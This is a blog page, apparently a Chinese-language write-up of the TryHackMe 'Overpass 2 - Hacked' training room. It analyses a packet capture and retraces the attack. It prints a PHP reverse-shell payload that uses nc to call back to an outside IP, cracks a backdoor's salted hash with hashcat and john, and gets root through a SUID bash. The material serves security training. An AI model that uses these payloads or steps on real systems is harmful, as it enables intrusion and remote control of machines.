@@ -1,0 +1,329 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked | symv1a</title><meta name="author" content="symv1a,symv1a@163.com"><meta name="copyright" content="symv1a"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked">
+<meta property="og:url" content="https://symya.github.io/post/overpass-2-hacked-1pfl8c.html">
+<meta property="og:site_name" content="symv1a">
+<meta property="og:description" content="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png">
+<meta property="article:published_time" content="2024-07-18T21:42:13.000Z">
+<meta property="article:modified_time" content="2024-07-18T00:00:00.000Z">
+<meta property="article:author" content="symv1a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked",
+  "url": "https://symya.github.io/post/overpass-2-hacked-1pfl8c.html",
+  "image": "https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png",
+  "datePublished": "2024-07-18T21:42:13.000Z",
+  "dateModified": "2024-07-18T00:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "symv1a",
+      "url": "https://symya.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><link rel="canonical" href="https://symya.github.io/post/overpass-2-hacked-1pfl8c.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" alt="Logo"><span class="site-name">symv1a</span></a><a class="nav-page-title" href="/"><span class="site-name">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-18T21:42:13.000Z" title="Created 2024-07-18 21:42:13">2024-07-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-18T00:00:00.000Z" title="Updated 2024-07-18 00:00:00">2024-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/THM/">THM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">565</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>2mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:150,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2024-07-18 00:00:00&quot;}" hidden></div><h1 id="THM-Offensive-Pentesting-Section2-Overpass-2-Hacked"><a href="#THM-Offensive-Pentesting-Section2-Overpass-2-Hacked" class="headerlink" title="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked"></a>THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</h1><blockquote>
+<p>Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。</p>
+<p>您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？</p>
+</blockquote>
+<h1 id="他们用来上传反向-shell-的页面-URL-是什么？"><a href="#他们用来上传反向-shell-的页面-URL-是什么？" class="headerlink" title="他们用来上传反向 shell 的页面 URL 是什么？"></a>他们用来上传反向 shell 的页面 URL 是什么？</h1><p>流量包中可以看到是<code>development</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125043.png" alt="image"></p>
+<p>‍</p>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">exec</span>(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;</span>)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>密码在tcp流3中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125045.png" alt="image"></p>
+<p>发现使用了ssh-backdoor</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125046.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NinjaJc01/ssh-backdoor</span><br></pre></td></tr></table></figure>
+
+<h1 id="研究——分析代码"><a href="#研究——分析代码" class="headerlink" title="研究——分析代码"></a>研究——分析代码</h1><p>把后门代码拉下来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125048.png" alt="image"></p>
+<p>得到默认hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</span><br></pre></td></tr></table></figure>
+
+<p>分析源代码，得到加盐值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125146.png" alt="image"></p>
+<p>得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1c362db832f3f864c8c2fe05f2002a05</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>爆破hash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125149.png" alt="image"></p>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>使用hashcat爆破，格式：<code>&lt;hash&gt;:&lt;salt&gt;</code>，保存到passwd.txt文件中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1710 -a 0 passwd.txt /usr/share/wordlists/rockyou.txt -O</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>已知为<code>SHA512(pass+salt)</code>​，构造<code>passwd1.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$dynamic_82$&lt;hash&gt;$&lt;salt&gt;</span><br><span class="line"></span><br><span class="line">$dynamic_82$6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125150.png" alt="image"></p>
+<p>november16</p>
+<p>‍</p>
+<h1 id="Attack-Get-back-in"><a href="#Attack-Get-back-in" class="headerlink" title="Attack - Get back in!"></a>Attack - Get back in!</h1><p>做代理后，访问靶机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125150.png" alt="image">发现标题</p>
+<p>nmap扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@jp4-20250507143913fda8f6:~# nmap -sV -sC -p- --min-rate 10000 10.10.147.5</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-08 01:06 EDT</span><br><span class="line">Warning: 10.10.147.5 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.147.5</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 52513 closed ports, 13019 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)</span><br><span class="line">|   256 <span class="built_in">fc</span>:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)</span><br><span class="line">|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: LOL Hacked</span><br><span class="line">2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.01 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据目前为止收集的信息，我尝试以用户 <strong>james</strong> 的身份登录。使用爆破出来的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 james@10.10.147.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125435.png" alt="image"></p>
+<p>getshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250508131319-iw2v3s4.png" alt="image"></p>
+<p>发现<code>.suid_bash</code>​文件为<code>root</code>所有</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125330.png" alt="image"></p>
+<p>运行发现是个<code>bash</code>​，<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/bash/">bash | GTFOBins</a>，发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./.suid_bash -p</span><br></pre></td></tr></table></figure>
+
+<p>可以获取root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125502.png" alt="image"></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://symya.github.io">symv1a</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://symya.github.io/post/overpass-2-hacked-1pfl8c.html">https://symya.github.io/post/overpass-2-hacked-1pfl8c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/skynet-z1e39th.html" title="THM - Offensive Pentesting - Section2 - Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Skynet</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDTWarning: 10.10.220.42 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.220.42Host is up (0.23s latency).Not shown: 51285 closed ports, 14244 filtered portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh ...</div></div></div></a><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/kenobi-z1xnvhq.html" title="THM - Offensive Pentesting - Section - Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-07</div><div class="info-item-2">THM - Offensive Pentesting - Section - Kenobi</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nmap -sV -sC -p- --min-rate 10000 10.10.166.21Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 09:40 EDTNmap scan report for 10.10.166.21Host is up (0.24s...</div></div></div></a><a class="pagination-related" href="/post/skynet-z1e39th.html" title="THM - Offensive Pentesting - Section2 - Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Skynet</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDTWarning: 10.10.220.42 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.220.42Host is up (0.23s latency).Not shown: 51285 closed ports, 14244 filtered portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh ...</div></div></div></a><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a><a class="pagination-related" href="/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html" title="2022网鼎杯决赛内网靶场复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="info-item-2">2022网鼎杯决赛内网靶场复现</div></div><div class="info-2"><div class="info-item-1">2022网鼎杯决赛内网靶场复现工具 目录扫描工具[[dirsreach]]，[[gobuster]] , antsword，godzilla，[[fscan]]，[[WPScan]]，[[chisel]]，[[frp]]，[[Proxifier]] , [[msf]]，[[WMIexec]]，rdp是什么，[[CrackMapExec]] 复现 靶标介绍：该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。 考点：  wordpress插件rce MS17-010 AS-REP Roasting 基于资源的约束性委派 智能卡身份验证出错下的CVE-2022–26923 AD域提权打法——Schannel传递证书传递到LDAPS，修改LDAP配置RBCD  渗透的过程  外网打点  -&gt;...</div></div></div></a><a class="pagination-related" href="/post/the-shooting-range-that-i-accidentally-discovered-during-a-mysterious-group-chat-bwhwi.html" title="水群看见的靶场，打一打"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">水群看见的靶场，打一打</div></div><div class="info-2"><div class="info-item-1">水群看见的靶场，打一打 地址：http://111.119.241.115:10088/ 开放一个靶机，靶机每30分钟重置一次  你需要完成信息收集，拿到初次的一些信息来完成后续的漏洞攻击 你需要找到第二个漏洞来获取第三个高危漏洞 恭喜你获取到了第三个漏洞点，不过值得烧脑的是这个获取shell不是很容易 历经千辛万苦，你获取到了shell，但是需要查看根目录下的flag还是有难度的，你需要根据常用的提权方式和主机的信息泄露获取到后面的一些权限 恭喜你获取到了权限，但还不是root，仔细看看怎么样获取到flag文件？  环境为仿真自建，不针对其他cms，漏洞思路来源于当前现实生活，思路比较新，有一些ctf烧脑，难度适中#渗透测试 #CTF #提权  ‍ 直接给的ip+端口号，可以忽略扫端口那一整块。直接扫目录 ​​ ​​ 扫到了一个database.sql​文件，down下来，审计发现： 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS `admins`;/*!40101 SET...</div></div></div></a><a class="pagination-related" href="/post/ccb-z184yjw.html" title="ccb&amp;ciscn线下半决赛 - wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ccb&amp;ciscn线下半决赛 - wp</div></div><div class="info-2"><div class="info-item-1">ccb&amp;ciscn线下半决赛 - wp 有幸拿到一等奖  awdpphp-master 导入 12345# docker 导入docker load -i xxx.tar# 